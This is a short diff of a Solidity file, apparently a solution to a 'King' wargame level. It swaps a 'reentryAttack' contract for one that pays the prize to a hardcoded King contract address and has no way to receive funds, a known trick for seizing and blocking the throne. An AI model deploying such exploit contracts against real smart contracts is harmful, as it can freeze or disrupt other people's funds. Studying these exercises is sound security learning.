@@ -3,26 +3,16 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import './King.sol';
 
 
+import "King/King.sol";
 
-
-
-contract reentryAttack {
-
-    King public kingContract;
-
-
-    constructor(King _kingContract) payable {
-        kingContract = _kingContract;
+contract Newking{
+    King level9 = King(0x658D750D45cbc21d244117295A69248f09fE06E1);
+    constructor() public payable{
+        address(level9).call{value: level9.prize()}("");
     }
-
-
-    fallback() external payable {
-        (bool success, ) = address(kingContract).call(abi.encodeWithSignature("receive()"));
-        require(success);
-    }
-
-
 }
+
+
+
